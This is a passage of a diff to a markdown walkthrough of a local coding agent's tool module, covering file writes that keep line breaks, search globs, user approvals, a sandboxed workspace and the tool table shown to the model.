@@ -19,7 +19,7 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
   1 | """The tools the model may call, plus the verify-before-write/run gates.
   2 | 
   3 | Core rule: broken code never stays on disk and never gets executed (Python,
-  4 | JSON, TOML and JavaScript are checked; see verify.py).
+  4 | JSON, TOML, JavaScript and many more are checked; see verify.py).
   5 |   * write_file / edit_file write, verify, and ROLL BACK if verification fails.
   6 |   * run_python / run_tests re-verify first (a second, independent check).
   7 | Every tool returns a plain string; failures are returned, never raised, so the
@@ -41,8 +41,8 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
  23 | from .config import Config
  24 | from .mcp import MCPError, MCPServer, clean_schema
  25 | from .runners import make_runner
- 26 | from .sandbox import (SKIP_DIRS, SandboxError, resolve_inside, run_command, shell_argv, truncate,
- 27 |                       walk_files)
+ 26 | from .sandbox import (SKIP_DIRS, SandboxError, looks_binary, project_files, quote_for_shell,
+ 27 |                       resolve_inside, run_command, shell_argv, skip_dir, truncate, walk_files)
  28 | from .settings import PROJECT_SETTINGS, Permissions
  29 | from .verify import CHECKED_SUFFIXES, _installed, verify_file, verify_python
  30 | from .web import fetch_text
@@ -50,24 +50,33 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
  32 | __all__ = ["SKIP_DIRS", "READ_ONLY", "Approval", "Tool", "ToolBox"]   # SKIP_DIRS re-exported
  33 | MAX_SEARCH_HITS = 40
  34 | MAX_SEARCH_FILES = 20_000
- 35 | TOGETHER_HINT = ("Hint: if this name is defined by another edit you have not made yet (for example "
- 36 |                  "a rename), send ALL related edits together in ONE multi_edit call, or use "
- 37 |                  "edit_file with all=true.")
- 38 | READ_ONLY = frozenset({"list_files", "read_file", "search", "outline"})
- 39 | 
- 40 | 
- 41 | DONE_MARKS = ("(done)", "[done]", "(completed)", "- done", "✓", "✔")
- 42 | 
- 43 | 
+ 35 | MAX_SEARCH_BYTES = 2_000_000          # bigger files (logs, data, bundles) are not searched
+ 36 | MAX_READ_BYTES = 8_000_000            # bigger files are only read in parts (start/end)
+ 37 | TOGETHER_HINT = ("Hint: if this name is defined by another edit you have not made yet (for example "
+ 38 |                  "a rename), send ALL related edits together in ONE multi_edit call, or use "
+ 39 |                  "edit_file with all=true.")
+ 40 | EMPTY_OLD = ("ERROR: 'old' must not be empty: copy the exact text to replace from the file "
+ 41 |              "(to write a whole file, use write_file)")
+ 42 | READ_ONLY = frozenset({"list_files", "read_file", "search", "outline"})
+ 43 | TextStyle = tuple[str, bool]          # (line break "\n" or "\r\n", starts with a byte-order mark)
+ 44 | CRLF_SUFFIXES = frozenset({".bat", ".cmd"})   # Windows batch files need CRLF line breaks
+ 45 | 
+ 46 | 
+ 47 | DONE_MARKS = ("(done)", "[done]", "(completed)", "- done", "✓", "✔")
+ 48 | 
+ 49 | 
 ```
 - Docstring states the core rule. Imports: `ast` (parse Python for `outline`), `difflib` (edit diffs for your
-  screen), `json` (MCP arguments), `os` (Windows or not, for hooks), `time` (session start), `fnmatch` (file-name patterns for
-  `search`), `re` (regular expressions for `search`), `sys` (the current Python's path,
-  `sys.executable`), `dataclass`, `Path`, `Callable`, the `Config`, sandbox helpers, and `verify_python`.
+  screen), `json` (MCP arguments), `time` (session start), `fnmatch` (file-name patterns for `search`), `re` (regular
+  expressions for `search`, braces in globs), `sys` (the current Python's path, `sys.executable`), `dataclass`, `Path`,
+  `Callable`, the `Config`, the sandbox helpers (`looks_binary`, `project_files`, `quote_for_shell`, `skip_dir` ...),
+  and `verify_python`.
 - `SKIP_DIRS` and `walk_files` now live in `sandbox.py` (one shared definition); `__all__` re-exports `SKIP_DIRS` so
   older imports keep working. `verify_file`/`CHECKED_SUFFIXES` come from `verify.py`.
   `MAX_SEARCH_HITS`: a search stops after 40 matches to protect the context window; `MAX_SEARCH_FILES` stops it after
-  20 000 files (with a hint to narrow the search) so a search in a giant folder cannot hang. `TOGETHER_HINT` is added to a
+  20 000 files (with a hint to narrow the search) so a search in a giant folder cannot hang. `MAX_SEARCH_BYTES`: files
+  over 2 MB (logs, data, bundled JavaScript) are not searched. `MAX_READ_BYTES`: files over 8 MB are only read in parts.
+  `EMPTY_OLD` is the refusal for an edit with nothing to find. `TOGETHER_HINT` is added to a
   rejection caused by an undefined name (ruff `F821`): it tells the model to send related edits — such as both halves
   of a rename — together in one `multi_edit`. Added after the `rename_function` eval showed the model making the two
   edits one by one, so the first was (correctly) rejected as inconsistent.
@@ -75,21 +84,81 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 - `DONE_MARKS`: text endings that mean "this checklist item is finished" (see `_todo_item`).
 - `READ_ONLY`: the names of tools that never change anything (`list_files`, `read_file`, `search`, `outline`); the agent
   runs batches made only of these in parallel. `_installed` (from `verify.py`) tells whether ruff can be used.
+- `TextStyle` describes how a text file is written: its line break (`"\n"` or `"\r\n"`) and whether it starts with a
+  byte-order mark. `CRLF_SUFFIXES`: new Windows batch files (`.bat`, `.cmd`) get CRLF, which they need to run correctly.
+
+## Writing files exactly as they were written before
+**A data-integrity fix of version 0.6.** Python's `read_text` turns `\r\n` into `\n`, and `write_text` on Windows turns
+every `\n` back into `\r\n`. So before 0.6 one small `edit_file` on Windows rewrote **every line** of a file that used
+Unix line breaks (most projects from GitHub): git then showed the whole file as changed. Even a *rejected* write did it,
+because the rollback wrote the old text back the same way. Files with a byte-order mark lost or doubled it. Now each
+file keeps its own line breaks and mark, and a rollback restores the exact old bytes.
+
+```python
+ 62 | def text_style(raw: str) -> TextStyle:
+ 63 |     """How a text file is written: its usual line break and whether it has a byte-order mark."""
+ 64 |     crlf = raw.count("\r\n")
+ 65 |     return ("\r\n" if crlf > raw.count("\n") - crlf else "\n"), raw.startswith("﻿")
+ 66 | 
+ 67 | 
+```
+- Counts `\r\n` against lone `\n`: a file that mostly uses CRLF is written with CRLF, otherwise LF (a file mixing both is
+  made consistent with its majority). Notes whether it starts with the mark `﻿`.
+
+```python
+ 68 | def read_text(path: Path) -> tuple[str, TextStyle]:
+ 69 |     """A UTF-8 file's text with plain "\\n" line breaks (no mark), plus its style to write back."""
+ 70 |     with path.open(encoding="utf-8", newline="") as handle:     # newline="": see "\r\n" as is
+ 71 |         raw = handle.read()
+ 72 |     style = text_style(raw)
+ 73 |     text = raw.replace("\r\n", "\n")
+ 74 |     return (text[1:] if style[1] else text), style
+ 75 | 
+ 76 | 
+```
+- Opens the file with `newline=""` (the `\r\n` stay visible), notes the style, and returns the text with plain `\n`
+  and without the mark — the form the model sees and edits match against.
+
+```python
+ 77 | def write_text(path: Path, text: str, style: TextStyle) -> None:
+ 78 |     """Write ``text`` in ``style``, so an edit never changes a file's line breaks or mark."""
+ 79 |     newline, mark = style
+ 80 |     path.write_text(("﻿" if mark else "") + text.replace("\r\n", "\n"),
+ 81 |                     encoding="utf-8", newline=newline)
+ 82 | 
+ 83 | 
+```
+- Writes the text back in the given style: the mark first if the file had one, and `newline=` makes Python write every
+  `\n` as the file's own line break. `\r\n` sent by the model is turned into `\n` first, so it can never become `\r\r\n`.
+
+```python
+ 84 | def _globs(pattern: str) -> list[str]:
+ 85 |     """``*.{js,ts}`` -> ``["*.js", "*.ts"]`` (fnmatch itself knows no braces)."""
+ 86 |     found = re.search(r"\{([^{}]*)\}", pattern)
+ 87 |     if not found:
+ 88 |         return [pattern]
+ 89 |     return [expanded for option in found.group(1).split(",")
+ 90 |             for expanded in _globs(pattern[:found.start()] + option + pattern[found.end():])]
+ 91 | 
+ 92 | 
+```
+- Python's `fnmatch` has no braces, but models often write `*.{js,ts}`; this expands them into `*.js` and `*.ts`
+  (recursively, for several brace groups).
 
 ## `_todo_item`
 ```python
- 44 | def _todo_item(item: object) -> dict:
- 45 |     """One checklist entry from ``{"text", "done"}`` or plain text; "... (done)" also counts as done."""
- 46 |     text = str(item.get("text", "")) if isinstance(item, dict) else str(item)
- 47 |     done = bool(item.get("done", False)) if isinstance(item, dict) else False
- 48 |     for mark in DONE_MARKS:                                # models often write the state into the text
- 49 |         if text.lower().rstrip().endswith(mark):
- 50 |             text, done = text.rstrip()[: -len(mark)].rstrip(), True
- 51 |     if text.lstrip().lower().startswith("[x]"):
- 52 |         text, done = text.lstrip()[3:].lstrip(), True
- 53 |     return {"text": text, "done": done}
- 54 | 
- 55 | 
+ 50 | def _todo_item(item: object) -> dict:
+ 51 |     """One checklist entry from ``{"text", "done"}`` or plain text; "... (done)" also counts as done."""
+ 52 |     text = str(item.get("text", "")) if isinstance(item, dict) else str(item)
+ 53 |     done = bool(item.get("done", False)) if isinstance(item, dict) else False
+ 54 |     for mark in DONE_MARKS:                                # models often write the state into the text
+ 55 |         if text.lower().rstrip().endswith(mark):
+ 56 |             text, done = text.rstrip()[: -len(mark)].rstrip(), True
+ 57 |     if text.lstrip().lower().startswith("[x]"):
+ 58 |         text, done = text.lstrip()[3:].lstrip(), True
+ 59 |     return {"text": text, "done": done}
+ 60 | 
+ 61 | 
 ```
 - Turns one checklist entry into `{text, done}`. Accepts `{"text": ..., "done": ...}` or plain text. Real models often
   write the state into the text instead of setting `done` (seen in the end-to-end test: every item said "(done)" while
@@ -98,22 +167,22 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 
 ## `Approval`
 ```python
- 56 | class Approval(str):
- 57 |     """The question shown to the user ("run python a.py") that also carries, for permission
- 58 |     rules and "always allow" answers, which tool asks and about what (command, file, URL)."""
- 59 | 
- 60 |     tool: str
- 61 |     subject: str
- 62 | 
+ 93 | class Approval(str):
+ 94 |     """The question shown to the user ("run python a.py") that also carries, for permission
+ 95 |     rules and "always allow" answers, which tool asks and about what (command, file, URL)."""
+ 96 | 
+ 97 |     tool: str
+ 98 |     subject: str
+ 99 | 
 ```
 ```python
- 63 |     def __new__(cls, text: str, tool: str, subject: str) -> "Approval":
- 64 |         question = super().__new__(cls, text)
- 65 |         question.tool = tool
- 66 |         question.subject = subject
- 67 |         return question
- 68 | 
- 69 | 
+100 |     def __new__(cls, text: str, tool: str, subject: str) -> "Approval":
+101 |         question = super().__new__(cls, text)
+102 |         question.tool = tool
+103 |         question.subject = subject
+104 |         return question
+105 | 
+106 | 
 ```
 - The question shown to you ("run python main.py") is an `Approval`: a normal string (so every approval function that
   expects text keeps working, and `"main.py" in question` works) that **also** carries `tool` and `subject`. The CLI's
@@ -122,24 +191,24 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 
 ## `Tool`
 ```python
- 70 | @dataclass(frozen=True)
- 71 | class Tool:
- 72 |     """A callable plus the JSON schema the model sees."""
- 73 | 
- 74 |     name: str
- 75 |     description: str
- 76 |     parameters: dict
- 77 |     func: Callable[[dict], str]
- 78 | 
+107 | @dataclass(frozen=True)
+108 | class Tool:
+109 |     """A callable plus the JSON schema the model sees."""
+110 | 
+111 |     name: str
+112 |     description: str
+113 |     parameters: dict
+114 |     func: Callable[[dict], str]
+115 | 
 ```
 ```python
- 79 |     def spec(self) -> dict:
- 80 |         """Ollama/OpenAI-style function definition."""
- 81 |         return {"type": "function", "function": {
- 82 |             "name": self.name, "description": self.description,
- 83 |             "parameters": self.parameters}}
- 84 | 
- 85 | 
+116 |     def spec(self) -> dict:
+117 |         """Ollama/OpenAI-style function definition."""
+118 |         return {"type": "function", "function": {
+119 |             "name": self.name, "description": self.description,
+120 |             "parameters": self.parameters}}
+121 | 
+122 | 
 ```
 - A frozen record of: `name`, `description` (the model reads this to decide when to use the tool), `parameters` (a
   JSON schema describing the arguments), and `func`, the Python function that implements it.
@@ -147,43 +216,44 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 
 ## `_schema`
 ```python
- 86 | def _schema(properties: dict, required: list[str]) -> dict:
- 87 |     """Build a JSON-schema object for tool parameters."""
- 88 |     return {"type": "object", "properties": properties, "required": required}
- 89 | 
- 90 | 
+123 | def _schema(properties: dict, required: list[str]) -> dict:
+124 |     """Build a JSON-schema object for tool parameters."""
+125 |     return {"type": "object", "properties": properties, "required": required}
+126 | 
+127 | 
 ```
 - Builds a JSON-schema object: `properties` lists the arguments, `required` the mandatory ones. It removes
   boilerplate from the tool table.
 
 ## `ToolBox` setup
 ```python
- 91 | class ToolBox:
- 92 |     """Owns the workspace, the tool table and the per-file failure counters."""
- 93 | 
+128 | class ToolBox:
+129 |     """Owns the workspace, the tool table and the per-file failure counters."""
+130 | 
 ```
 ```python
- 94 |     def __init__(self, config: Config, approve: Callable[[str], bool] | None = None,
- 95 |                  settings: dict | None = None) -> None:
- 96 |         self._cfg = config
- 97 |         config.workspace.mkdir(parents=True, exist_ok=True)
- 98 |         self._root = config.workspace.resolve()
- 99 |         self._approve = approve or (lambda _action: False)
-100 |         self._failures: dict[str, int] = {}
-101 |         self.writes = 0                           # successful file writes so far
-102 |         self.started = time.time()                # files changed after this are "this session's"
-103 |         self.runner = make_runner(config, self._root)   # where code runs: host or container
-104 |         self.todo: list[dict] = []                # the model's visible task checklist
-105 |         self.permissions = Permissions.from_settings(
-106 |             settings or {}, self._root / PROJECT_SETTINGS if settings is not None else None)
-107 |         self.notes: list[str] = []                # startup messages for the user (MCP servers)
-108 |         self._diff: list[str] = []                # diff of the latest successful write
-109 |         self._mcp: list[MCPServer] = []
-110 |         self._tools = {t.name: t for t in self._build()}
-111 |         self._start_mcp((settings or {}).get("mcpServers", {}))
-112 |         self.hooks: dict = dict((settings or {}).get("hooks", {}))   # your own commands (see run_hook)
-113 | 
-114 |     # ----- public API used by the agent -------------------------------------
+131 |     def __init__(self, config: Config, approve: Callable[[str], bool] | None = None,
+132 |                  settings: dict | None = None) -> None:
+133 |         self._cfg = config
+134 |         config.workspace.mkdir(parents=True, exist_ok=True)
+135 |         self._root = config.workspace.resolve()
+136 |         self._approve = approve or (lambda _action: False)
+137 |         self._failures: dict[str, int] = {}
+138 |         self.writes = 0                           # successful file writes so far
+139 |         self.started = time.time()                # files changed after this are "this session's"
+140 |         self.runner = make_runner(config, self._root)   # where code runs: host or container
+141 |         self.todo: list[dict] = []                # the model's visible task checklist
+142 |         self.permissions = Permissions.from_settings(
+143 |             settings or {}, self._root / PROJECT_SETTINGS if settings is not None else None)
+144 |         self.notes: list[str] = []                # startup messages for the user (MCP servers)
+145 |         self._diff: list[str] = []                # diff of the latest successful write
+146 |         self._mcp: list[MCPServer] = []
+147 |         self._tools = {t.name: t for t in self._build()}
+148 |         self._start_mcp((settings or {}).get("mcpServers", {}))
+149 |         self.hooks: dict = dict((settings or {}).get("hooks", {}))   # your own commands (see run_hook)
+150 |         self.test_command = str((settings or {}).get("test_command") or "")   # "" = detect
+151 | 
+152 |     # ----- public API used by the agent -------------------------------------
 ```
 - Takes the config and an optional `approve` callback (asks the human; `None` means "always deny").
 - Creates the workspace folder if missing and keeps its absolute path as the sandbox root.
@@ -195,153 +265,161 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
   from the settings.
 - `started` is when this toolbox (session) began; files changed after it count as "this session's".
 - `writes` counts successful file writes (the agent uses it to notice "asked for a change, changed nothing"). `_failures` counts rejected writes per file. `_tools` is a `{name: Tool}` table built by `_build`.
+- `test_command` is your own test command from the settings (empty = let the runner choose, see `runners.md`).
 
 ## Public API
 ```python
-119 |     def close(self) -> None:
-120 |         """Release resources: the Docker sandbox container and any MCP server programs."""
-121 |         self.runner.stop()
-122 |         for server in self._mcp:
-123 |             server.close()
-124 | 
+157 |     def close(self) -> None:
+158 |         """Release resources: the Docker sandbox container and any MCP server programs."""
+159 |         self.runner.stop()
+160 |         for server in self._mcp:
+161 |             server.close()
+162 | 
 ```
 ```python
-125 |     def pop_diff(self) -> list[str]:
-126 |         """The diff of the latest write (for the user's screen only), then forget it."""
-127 |         diff, self._diff = self._diff, []
-128 |         return diff
-129 | 
+163 |     def pop_diff(self) -> list[str]:
+164 |         """The diff of the latest write (for the user's screen only), then forget it."""
+165 |         diff, self._diff = self._diff, []
+166 |         return diff
+167 | 
 ```
 - `pop_diff` hands the last write's diff to the agent (for your screen) and forgets it.
 - `close` releases resources: stops the sandbox container if one was started and every MCP server program. Called by the eval runner after each task and by
   the server when a session expires; the CLI relies on the exit-time clean-up.
 
 ```python
-130 |     @staticmethod
-131 |     def is_read_only(name: str) -> bool:
-132 |         """True for tools that never change anything, so they may run in parallel."""
-133 |         return name in READ_ONLY
-134 | 
+168 |     @staticmethod
+169 |     def is_read_only(name: str) -> bool:
+170 |         """True for tools that never change anything, so they may run in parallel."""
+171 |         return name in READ_ONLY
+172 | 
 ```
 - Static helper: is this tool name in `READ_ONLY`? Unknown names are not, so they run sequentially.
 
 ```python
-115 |     def specs(self) -> list[dict]:
-116 |         """Tool definitions to send to the model."""
-117 |         return [tool.spec() for tool in self._tools.values()]
-118 | 
+153 |     def specs(self) -> list[dict]:
+154 |         """Tool definitions to send to the model."""
+155 |         return [tool.spec() for tool in self._tools.values()]
+156 | 
 ```
 - The list of tool definitions sent to the model on every request.
 
 ```python
-135 |     def check_workspace(self, since: float | None = None) -> list[str]:
-136 |         """Verify checkable files (only those changed after ``since`` if given); list failures.
-137 | 
-138 |         Checking only changed files keeps this fast in big projects and never blames the
-139 |         agent for files that were already broken before it started.
-140 |         """
-141 |         problems: list[str] = []
-142 |         for path in walk_files(self._root):
-143 |             if since is not None and path.stat().st_mtime < since - 1.0:   # 1 s clock slack
-144 |                 continue
-145 |             if path.suffix.lower() in CHECKED_SUFFIXES:
-146 |                 report = verify_file(path, self._root, self._cfg.type_check)
-147 |                 if not report.ok:
-148 |                     problems.append(f"{path.relative_to(self._root).as_posix()}:\n{report.render()}")
-149 |         return problems
-150 | 
+173 |     def check_workspace(self, since: float | None = None) -> list[str]:
+174 |         """Verify checkable files (only those changed after ``since`` if given); list failures.
+175 | 
+176 |         Checking only changed files keeps this fast in big projects and never blames the
+177 |         agent for files that were already broken before it started.
+178 |         """
+179 |         problems: list[str] = []
+180 |         for path in walk_files(self._root):
+181 |             if since is not None and path.stat().st_mtime < since - 1.0:   # 1 s clock slack
+182 |                 continue
+183 |             if path.suffix.lower() in CHECKED_SUFFIXES:
+184 |                 report = verify_file(path, self._root, self._cfg.type_check)
+185 |                 if not report.ok:
+186 |                     problems.append(f"{path.relative_to(self._root).as_posix()}:\n{report.render()}")
+187 |         return problems
+188 | 
 ```
 - Verifies every checkable file found by `walk_files` — or, with `since`, only files modified after that moment (one
   second of slack for clock rounding) — and returns one entry per failing file (path plus errors). With `since` it is
   fast in big projects and never blames the agent for files that were already broken before it started. An empty list means everything is fine. Used by `_run_tests` and by the CLI's end-of-request check.
 
 ```python
-151 |     def call(self, name: str, args: dict) -> str:
-152 |         """Run one tool by name; always returns a string."""
-153 |         tool = self._tools.get(name)
-154 |         if tool is None:
-155 |             return f"ERROR: unknown tool '{name}'. Available: {', '.join(self._tools)}"
-156 |         try:
-157 |             return tool.func(args)
-158 |         except SandboxError as exc:
-159 |             return f"ERROR: {exc}"
-160 |         except (KeyError, TypeError, ValueError) as exc:
-161 |             return f"ERROR: bad arguments for {name}: {exc!r}"
-162 |         except OSError as exc:
-163 |             return f"ERROR: {exc}"
-164 | 
-165 |     # ----- tool table --------------------------------------------------------
+189 |     def call(self, name: str, args: dict) -> str:
+190 |         """Run one tool by name; always returns a string."""
+191 |         tool = self._tools.get(name)
+192 |         if tool is None:
+193 |             return f"ERROR: unknown tool '{name}'. Available: {', '.join(self._tools)}"
+194 |         try:
+195 |             return tool.func(args)
+196 |         except SandboxError as exc:
+197 |             return f"ERROR: {exc}"
+198 |         except UnicodeDecodeError:
+199 |             return ("ERROR: that file is not UTF-8 text (binary, or another encoding), so it "
+200 |                     "cannot be edited safely")
+201 |         except (KeyError, TypeError, ValueError) as exc:
+202 |             return f"ERROR: bad arguments for {name}: {exc!r}"
+203 |         except OSError as exc:
+204 |             return f"ERROR: {exc}"
+205 | 
+206 |     # ----- tool table --------------------------------------------------------
 ```
 - Looks the tool up; an unknown name (models sometimes invent tools) returns an error that lists the real ones.
 - Runs the function and converts expected failures into strings: `SandboxError` (path escape) → `ERROR:`;
-  `KeyError`/`TypeError`/`ValueError` (missing or wrong-typed argument) → "bad arguments"; `OSError` (permissions,
-  disk) → `ERROR:`.
+  `UnicodeDecodeError` (editing a file that is not UTF-8 text) → a clear "not UTF-8 text" error (it used to read "bad
+  arguments", which sent the model looking for a mistake in its arguments); `KeyError`/`TypeError`/`ValueError` (missing
+  or wrong-typed argument) → "bad arguments"; `OSError` (permissions, disk) → `ERROR:`.
 
 ## The tool table
 ```python
-166 |     def _build(self) -> list[Tool]:
-167 |         return [
-168 |             Tool("list_files", "List files and folders in a workspace folder.",
-169 |                  _schema({"path": {"type": "string", "description": "folder, default '.'"}}, []),
-170 |                  self._list_files),
-171 |             Tool("read_file", "Read a file with line numbers. Use start/end to read part of it.",
-172 |                  _schema({"path": {"type": "string"}, "start": {"type": "integer"},
-173 |                           "end": {"type": "integer"}}, ["path"]),
-174 |                  self._read_file),
-175 |             Tool("search", "Find lines matching a regular expression in workspace files "
-176 |                  "(like grep). Returns file:line: text. Much cheaper than reading files.",
-177 |                  _schema({"pattern": {"type": "string"},
-178 |                           "path": {"type": "string", "description": "folder, default '.'"},
-179 |                           "glob": {"type": "string", "description": "file pattern, default '*.py'"}},
-180 |                          ["pattern"]),
-181 |                  self._search),
-182 |             Tool("outline", "List the classes and functions (with line numbers) of one Python "
-183 |                  "file, or of every Python file in a folder. Cheaper than reading whole files.",
-184 |                  _schema({"path": {"type": "string", "description": "file or folder, default '.'"}},
-185 |                          []),
-186 |                  self._outline),
-187 |             Tool("write_file", "Create or overwrite a file. Python files are verified first "
-188 |                  "and rejected with the errors if they do not pass.",
-189 |                  _schema({"path": {"type": "string"}, "content": {"type": "string"}},
-190 |                          ["path", "content"]),
-191 |                  self._write_file),
-192 |             Tool("edit_file", "Replace one exact, unique piece of text in a file. To rename "
-193 |                  "something that appears several times in the file, set all=true.",
-194 |                  _schema({"path": {"type": "string"}, "old": {"type": "string"},
-195 |                           "new": {"type": "string"},
-196 |                           "all": {"type": "boolean", "description": "replace every occurrence"}},
-197 |                          ["path", "old", "new"]),
-198 |                  self._edit_file),
-199 |             Tool("multi_edit", "Apply several exact, unique text replacements to ONE file in a "
-200 |                  "single call (one verification). Each edit is {old, new}; they apply in order.",
-201 |                  _schema({"path": {"type": "string"},
-202 |                           "edits": {"type": "array", "items": {
-203 |                               "type": "object",
-204 |                               "properties": {"old": {"type": "string"}, "new": {"type": "string"}},
-205 |                               "required": ["old", "new"]}}}, ["path", "edits"]),
-206 |                  self._multi_edit),
-207 |             Tool("run_python", "Verify then run a Python file. Refuses if verification fails.",
-208 |                  _schema({"path": {"type": "string"},
-209 |                           "args": {"type": "array", "items": {"type": "string"}}}, ["path"]),
-210 |                  self._run_python),
-211 |             Tool("run_tests", "Verify all Python files, then run unittest discovery.",
-212 |                  _schema({}, []), self._run_tests),
-213 |             Tool("todo", "Show the user your plan as a checklist. Send the whole list each "
-214 |                  "time and set done=true on finished items. Use it for tasks with 3 or more steps.",
-215 |                  _schema({"items": {"type": "array", "items": {
-216 |                      "type": "object",
-217 |                      "properties": {"text": {"type": "string"}, "done": {"type": "boolean"}},
-218 |                      "required": ["text"]}}}, ["items"]),
-219 |                  self._todo),
-220 |             Tool("fetch_url", "Read a web page (for example library documentation) as plain "
-221 |                  "text. The user is asked first.",
-222 |                  _schema({"url": {"type": "string"}}, ["url"]), self._fetch_url),
-223 |         ] + ([Tool("run_shell", f"Run a shell command ({self.runner.shell_label}), e.g. pip "
-224 |                    "install, pytest, git, node. The workspace is the current folder.",
-225 |                    _schema({"command": {"type": "string"}}, ["command"]), self._run_shell)]
-226 |              if self.runner.supports_shell else [])
-227 | 
-228 |     # ----- read-only tools ---------------------------------------------------
+207 |     def _build(self) -> list[Tool]:
+208 |         return [
+209 |             Tool("list_files", "List files and folders in a workspace folder.",
+210 |                  _schema({"path": {"type": "string", "description": "folder, default '.'"}}, []),
+211 |                  self._list_files),
+212 |             Tool("read_file", "Read a text file with line numbers. Use start/end to read part of it.",
+213 |                  _schema({"path": {"type": "string"}, "start": {"type": "integer"},
+214 |                           "end": {"type": "integer"}}, ["path"]),
+215 |                  self._read_file),
+216 |             Tool("search", "Find lines matching a regular expression in workspace files (like "
+217 |                  "grep; files that .gitignore excludes are skipped). Returns file:line: text. "
+218 |                  "Much cheaper than reading files.",
+219 |                  _schema({"pattern": {"type": "string"},
+220 |                           "path": {"type": "string", "description": "folder or file, default '.'"},
+221 |                           "glob": {"type": "string", "description": "file pattern such as '*.py', "
+222 |                                    "'src/*.ts' or '*.{js,ts}'; default: all text files"}},
+223 |                          ["pattern"]),
+224 |                  self._search),
+225 |             Tool("outline", "List the classes and functions (with line numbers) of one Python "
+226 |                  "file, or of every Python file in a folder. Cheaper than reading whole files.",
+227 |                  _schema({"path": {"type": "string", "description": "file or folder, default '.'"}},
+228 |                          []),
+229 |                  self._outline),
+230 |             Tool("write_file", "Create or overwrite a file. Code and config files are verified "
+231 |                  "first (syntax, undefined names) and rejected with the errors if they do not pass.",
+232 |                  _schema({"path": {"type": "string"}, "content": {"type": "string"}},
+233 |                          ["path", "content"]),
+234 |                  self._write_file),
+235 |             Tool("edit_file", "Replace one exact, unique piece of text in a file. To rename "
+236 |                  "something that appears several times in the file, set all=true.",
+237 |                  _schema({"path": {"type": "string"}, "old": {"type": "string"},
+238 |                           "new": {"type": "string"},
+239 |                           "all": {"type": "boolean", "description": "replace every occurrence"}},
+240 |                          ["path", "old", "new"]),
+241 |                  self._edit_file),
+242 |             Tool("multi_edit", "Apply several exact, unique text replacements to ONE file in a "
+243 |                  "single call (one verification). Each edit is {old, new}; they apply in order.",
+244 |                  _schema({"path": {"type": "string"},
+245 |                           "edits": {"type": "array", "items": {
+246 |                               "type": "object",
+247 |                               "properties": {"old": {"type": "string"}, "new": {"type": "string"}},
+248 |                               "required": ["old", "new"]}}}, ["path", "edits"]),
+249 |                  self._multi_edit),
+250 |             Tool("run_python", "Verify then run a Python file. Refuses if verification fails.",
+251 |                  _schema({"path": {"type": "string"},
+252 |                           "args": {"type": "array", "items": {"type": "string"}}}, ["path"]),
+253 |                  self._run_python),
+254 |             Tool("run_tests", "Verify the changed files, then run the project's tests (pytest, "
+255 |                  "unittest, npm test, go test or cargo test: whichever the project uses).",
+256 |                  _schema({}, []), self._run_tests),
+257 |             Tool("todo", "Show the user your plan as a checklist. Send the whole list each "
+258 |                  "time and set done=true on finished items. Use it for tasks with 3 or more steps.",
+259 |                  _schema({"items": {"type": "array", "items": {
+260 |                      "type": "object",
+261 |                      "properties": {"text": {"type": "string"}, "done": {"type": "boolean"}},
+262 |                      "required": ["text"]}}}, ["items"]),
+263 |                  self._todo),
+264 |             Tool("fetch_url", "Read a web page (for example library documentation) as plain "
+265 |                  "text. The user is asked first.",
+266 |                  _schema({"url": {"type": "string"}}, ["url"]), self._fetch_url),
+267 |         ] + ([Tool("run_shell", f"Run a shell command ({self.runner.shell_label}), e.g. pip "
+268 |                    "install, pytest, git, node. The workspace is the current folder.",
+269 |                    _schema({"command": {"type": "string"}}, ["command"]), self._run_shell)]
+270 |              if self.runner.supports_shell else [])
+271 | 
+272 |     # ----- read-only tools ---------------------------------------------------
 ```
 - One `Tool(...)` per capability: `list_files`, `read_file` (optional `start`/`end` so the model can read only a
   slice), `search` (grep-like, far cheaper than reading files), `outline` (classes and functions with line numbers),
@@ -350,118 +428,160 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
   `run_shell`, plus `todo` (a checklist) and `fetch_url` (read a web page; always asked or ruled). The list is built as "base tools + optional shell tool", so the model
   never even sees a shell tool unless the runner offers one (Docker, or `--allow-shell` on this computer). The shell
   tool's description names where it runs (`shell_label`), e.g. "PowerShell on this Windows computer".
-- The descriptions are part of the prompt, so they are written to tell the model *when* to use each tool.
+- The descriptions are part of the prompt, so they are written to tell the model *when* to use each tool. Version 0.6
+  updated three: `search` (all text files by default, `.gitignore` honoured, glob examples), `write_file` ("code and
+  config files are verified" — it used to say only Python) and `run_tests` (whichever test tool the project uses).
 
 ## Read-only tools
 ```python
-229 |     def _list_files(self, args: dict) -> str:
-230 |         folder = resolve_inside(self._root, args.get("path", "."))
-231 |         if not folder.is_dir():
-232 |             return f"ERROR: '{args.get('path', '.')}' is not a folder"
-233 |         rows = [p.name + ("/" if p.is_dir() else "")
-234 |                 for p in sorted(folder.iterdir()) if p.name not in SKIP_DIRS]
-235 |         return "\n".join(rows) or "(empty folder)"
-236 | 
+273 |     def _list_files(self, args: dict) -> str:
+274 |         folder = resolve_inside(self._root, args.get("path") or ".")
+275 |         if not folder.is_dir():
+276 |             return f"ERROR: '{args.get('path', '.')}' is not a folder"
+277 |         rows = [p.name + ("/" if p.is_dir() else "")
+278 |                 for p in sorted(folder.iterdir()) if not (p.is_dir() and skip_dir(p.name))]
+279 |         return "\n".join(rows) or "(empty folder)"
+280 | 
 ```
 - Resolves the folder inside the sandbox; errors if it is not a folder; lists sorted names (folders get `/`), hiding
-  `SKIP_DIRS`; says "(empty folder)" when appropriate.
+  skipped *folders* (a file that happens to be called `dist` is still shown); says "(empty folder)" when appropriate.
 
 ```python
-237 |     def _read_file(self, args: dict) -> str:
-238 |         path = resolve_inside(self._root, args["path"])
-239 |         if not path.is_file():
-240 |             return f"ERROR: file '{args['path']}' does not exist"
-241 |         lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
-242 |         start = max(int(args.get("start", 1)), 1)
-243 |         end = min(int(args.get("end", len(lines))), len(lines))
-244 |         body = "\n".join(f"{n}: {lines[n - 1]}" for n in range(start, end + 1))
-245 |         return truncate(body, self._cfg.max_output_chars) or "(empty file)"
-246 | 
+281 |     def _read_file(self, args: dict) -> str:
+282 |         path = resolve_inside(self._root, args["path"])
+283 |         if not path.is_file():
